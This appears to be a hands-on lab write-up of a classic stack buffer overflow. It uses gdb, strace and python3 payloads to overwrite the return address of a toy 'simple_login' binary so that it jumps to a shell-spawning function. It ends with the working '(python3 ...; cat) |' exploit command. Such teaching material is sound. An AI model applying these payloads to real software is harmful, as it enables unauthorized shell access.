### Info
In this lab, we'll try to login to simple_login binary without knowing the password.<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS<br>
**Keywords**: buffer, overflow, shell, pipe, pwn, exploit

### Implementation
When we check the source code, we see
* In `authorize` function, there's the unsecure `gets` call which can overflow the `password` buffer if more than 64 bytes provided to standard input.
* `go_shell` spawns a shell if the password is correct.

Our goal is to exploit the binary such that `authorize` function should return to `go_shell`.<br/
NOTE: The stack addresses might be different in your environment. Additionally; if you rebuild the binary, assembly code might be different too.
But the idea is same in any case.

Start gdb, and put a breakpoint to authorize, then run 
```
(gdb) b *authorize 
Breakpoint 1 at 0x804858c: file simple_login.c, line 15.
(gdb) run
Starting program: /home/uzi/exploit_labs/lab1_simple_login_analysis/simple_login 
Breakpoint 1, authorize () at simple_login.c:15
15      {
(gdb)
```
We're inside `authorize`. 
```
(gdb) disassemble authorize 
Dump of assembler code for function authorize:
=> 0x0804858c <+0>:     push   ebp
   0x0804858d <+1>:     mov    ebp,esp
   0x0804858f <+3>:     sub    esp,0x58 ; 88 bytes (0x58) will be reserved in stack.
```
`si` 3 times to complete epilog and allocate stack.
```
(gdb) disassemble authorize 
Dump of assembler code for function authorize:
   0x0804858c <+0>:     push   ebp
   0x0804858d <+1>:     mov    ebp,esp
   0x0804858f <+3>:     sub    esp,0x58
=> 0x08048592 <+6>:     mov    DWORD PTR [esp],0x80486d1
```
We can see the previous $ebp, together with return address to main (0x080485dd) as the following.
If we can override 0x080485dd with the address of go_shell function, it seems that we can pwn the shell.
```
(gdb) x/2x $ebp
0xffffd518:     0xffffd538      0x080485dd
```
Put a breakpoint to the instruction after `call   0x80483e0 <gets@plt>`, so that we'll check how the stack looks like.
continue with c, and provide `AAAA`, when the binary asks for the password. It'll stop then in the last breakpoint we've added.
```
(gdb) b *0x080485a9
(gdb) c
Continuing.
Enter Password: AAAA
Breakpoint 2, authorize () at simple_login.c:19
19              if (!strcmp(password,secret))
(gdb) 
```
Below we can see the `password[64]` buffer in red, previous $ebp in green and return address in yellow rectangles.
The 16 bytes above password are for other local variables used to pass parameters to printf, gets, strcmp calls<br/>
![](image.png)
Now it's obvious that we need to provide 76 bytes to reach return address and then address of go_shell function to override return address.
```
(gdb) p go_shell 
$3 = {void ()} 0x804853d <go_shell>
```
Here is the payload to see really if our assumption works. The "\n" at the end of payload is necessary for gets to return and not written to the buffer.
```
uzi@pwnpatrol:$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*76 + b"\xBB"*4 + b"\n")' | ./simple_login 
Segmentation fault (core dumped)
```
I can check the core, or live debug with gdb whether $eip is overriden with 0xbbbbbbbb or not. But the easier method is to check dmesg.
```
uzi@pwnpatrol:$ dmesg | tail
....
[12091.203529] simple_login[18714]: segfault at bbbbbbbb ip 00000000bbbbbbbb sp 00000000ff941180 error 14 in libc-2.27.so[f7d55000+1d5000]
```
Above we see that instruction pointer has the value we specified. So we write the address of `go_shell` and run again.
It seems to be working..., but we didn't get the shell.
```
uzi@pwnpatrol:$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*76 + b"\x3d\x85\x04\x08"*4 + b"\n")' | ./simple_login 
Enter Password: Would you like to play a game...
uzi@pwnpatrol:$ 
```
Let's check with strace to see what happened. 
```
uzi@pwnpatrol:$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*76 + b"\x3d\x85\x04\x08"*4 + b"\n")' | strace ./simple_login
...
write(1, "Enter Password: Would you like t"..., 49Enter Password: Would you like to play a game...
) = 49
setreuid32(0, 1094795585)               = -1 EPERM (Operation not permitted)
execve("/bin/sh", ["/bin/sh"], NULL)    = 0
```
According to the strace output, it's clear that shell is spawned. But somehow it's closed and we can't see it. 
The reason is that an EOF is triggered on the pipe when the writer (python3 in this case) exits. An EOF terminates the spawned shell as if CTRL+D is pressed.<br/>
So just piping the initial command doesn't work.So we need to have another tool on the left side of pipe and this tool should read from stdin and then send the data to stdout. `cat` with no parameter exactly does it.
We'll add `cat` using subshelling.<br/>
Here it is, now the shell remains open, and we issue `id` command.
```
uzi@ip-172-31-39-140:$ (python3 -c 'import sys;sys.stdout.buffer.write(b"A"*76 + b"\x3d\x85\x04\x08"*4 + b"\n")'; cat) | ./simple_login
Enter Password: Would you like to play a game...
id
uid=1001(uzi) gid=1001(uzi) groups=1001(uzi),27(sudo),108(lxd),115(wireshark)
```
